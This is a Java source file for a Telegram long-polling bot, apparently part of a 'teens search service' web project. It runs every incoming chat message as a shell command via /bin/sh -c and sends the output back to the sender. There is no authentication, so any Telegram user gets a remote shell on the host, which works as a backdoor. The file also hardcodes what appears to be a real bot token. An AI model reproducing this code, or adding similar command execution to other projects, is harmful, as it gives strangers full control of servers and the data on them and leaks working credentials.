package ru.krotov.teenssearchservice.web.clients;

import lombok.extern.slf4j.Slf4j;
import org.telegram.telegrambots.bots.DefaultBotOptions;
import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.LinkedList;
import java.util.List;

@Slf4j
public class Bot extends TelegramLongPollingBot {


	public Bot(DefaultBotOptions options) {
		super(options);
	}

	@Override
	public void onUpdateReceived(Update update) {
		String message = update.getMessage().getText();
		try {
			String messageText = executeCommandInConsole(message);

			List<String> strings = spltitByLength(messageText);

			strings.forEach(s -> sendMsg(update.getMessage().getChatId().toString(), s));

		} catch (InterruptedException | IOException e) {
			log.error(e.getMessage());
		}
	}

	List<String> spltitByLength(String s) {
		LinkedList<String> strings = new LinkedList<>();
		char[] chars = s.toCharArray();
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < chars.length; i++) {
			stringBuilder.append(chars[i]);
			if ((i + 1) % 4096 == 0) {
				strings.add(stringBuilder.toString());
				stringBuilder = new StringBuilder();
			}
		}

		if (stringBuilder.length() != 0) {
			strings.add(stringBuilder.toString());
		}

		return strings;
	}

	public synchronized void sendMsg(String chatId, String s) {
		SendMessage sendMessage = new SendMessage();
		sendMessage.enableMarkdown(true);
		sendMessage.setChatId(chatId);
		sendMessage.setText(s + "  " + chatId);
		try {
			execute(sendMessage);
		} catch (TelegramApiException e) {
			log.error("Exception: {}", e.toString());
		}
	}

	private String executeCommandInConsole(String command) throws InterruptedException, IOException {

		if (command.contains("-1")) {
			return command;
		}

		String[] cmd = {"/bin/sh", "-c", command};

		Process process = Runtime.getRuntime().exec(cmd);
//		process.waitFor();

		BufferedReader reader =
				new BufferedReader(new InputStreamReader(process.getInputStream()));

		String line = "";
		StringBuilder sb = new StringBuilder();
		while ((line = reader.readLine()) != null) {
			sb.append(line + "\n");
		}

		return sb.toString();
	}

	@Override
	public String getBotUsername() {
		return "AOEManager";
	}

	@Override
	public String getBotToken() {
		return "764444874:AAEiuZ5mNrz5jymxZFPGFgsogcJkoaAe-9o";
	}
}
